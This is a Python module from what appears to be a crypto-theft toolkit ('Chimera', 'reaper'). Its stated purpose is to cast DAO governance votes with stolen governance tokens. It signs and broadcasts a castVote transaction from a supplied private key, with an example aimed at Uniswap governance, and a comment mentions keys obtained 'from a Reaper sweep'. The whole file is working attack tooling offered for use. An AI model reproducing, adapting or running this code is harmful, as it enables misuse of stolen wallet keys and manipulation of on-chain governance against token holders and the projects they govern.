# [Homebrew 4] - Chimera Project
# Module: governance_attacker.py
# Purpose: To use stolen governance tokens to vote on proposals.

import sys
import os
from web3 import Web3

# --- Add Project Root to Path ---
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from reaper.utils.config import CHAINS

# --- ABI for standard Governor contracts (like Compound's Governor Bravo) ---
GOVERNOR_ABI = '[{"inputs":[{"internalType":"uint256","name":"proposalId"},{"internalType":"uint8","name":"support"}],"name":"castVote","outputs":[],"stateMutability":"nonpayable","type":"function"}]'


def vote_on_proposal(chain: str, governance_contract_address: str, proposal_id: int, private_key: str, vote_for: bool):
    """
    Casts a vote on a given proposal from a wallet holding governance tokens.
    """
    if chain not in CHAINS:
        print(f"[ERROR] Chain '{chain}' not configured in reaper/utils/config.py")
        return

    chain_config = CHAINS[chain]
    w3 = Web3(Web3.HTTPProvider(chain_config['rpc_url']))
    if not w3.is_connected():
        print(f"[FATAL] Could not connect to {chain.upper()} network.")
        return

    operator_account = w3.eth.account.from_key(private_key)
    operator_address = operator_account.address
    chain_id = chain_config['chain_id']

    print(f"--- GOVERNANCE ATTACK INITIATED ON {chain.upper()} ---")
    print(f"Operator Address: {operator_address}")
    print(f"Governance Contract: {governance_contract_address}")
    print(f"Proposal ID: {proposal_id}")
    
    # support: 1 = FOR, 0 = AGAINST
    support = 1 if vote_for else 0
    vote_string = "FOR" if vote_for else "AGAINST"
    print(f"Attempting to vote '{vote_string}'...")

    try:
        governor_contract = w3.eth.contract(address=governance_contract_address, abi=GOVERNOR_ABI)
        
        nonce = w3.eth.get_transaction_count(operator_address)

        tx_vote = governor_contract.functions.castVote(
            proposal_id,
            support
        ).build_transaction({
            'from': operator_address,
            'chainId': chain_id,
            'gas': 300000,
            'gasPrice': w3.eth.gas_price,
            'nonce': nonce,
        })

        signed_tx = w3.eth.account.sign_transaction(tx_vote, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print(f"Vote transaction sent. Hash: {tx_hash.hex()}. Waiting for confirmation...")
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print("[SUCCESS] Vote has been cast successfully.")

    except Exception as e:
        print(f"[!!!] CRITICAL ERROR during voting operation: {e}")

if __name__ == '__main__':
    # --- MANUAL EXECUTION EXAMPLE ---
    # This requires you to find an active proposal and have the corresponding governance tokens.
    
    # Example: Uniswap Governance on Ethereum
    # You would need a wallet with UNI tokens to vote.
    
    # CONFIGURATION
    TARGET_CHAIN = "eth" 
    # Uniswap Governor Alpha (example, may be outdated)
    GOVERNANCE_ADDRESS = "0x5e4be8Bc9637f0EAA1A755019e06A68ce081D58F" 
    # You need to find an active proposal ID to vote on.
    PROPOSAL_ID = 123 
    # The private key of the wallet holding the governance tokens (e.g., from a Reaper sweep)
    TOKEN_HOLDER_PRIVATE_KEY = "YOUR_TOKEN_HOLDER_PRIVATE_KEY"
    # Vote FOR (True) or AGAINST (False)
    VOTE_DECISION = True

    if TOKEN_HOLDER_PRIVATE_KEY == "YOUR_TOKEN_HOLDER_PRIVATE_KEY":
        print("Please configure the private key of the governance token holder.")
    else:
        vote_on_proposal(
            chain=TARGET_CHAIN,
            governance_contract_address=GOVERNANCE_ADDRESS,
            proposal_id=PROPOSAL_ID,
            private_key=TOKEN_HOLDER_PRIVATE_KEY,
            vote_for=VOTE_DECISION
        )
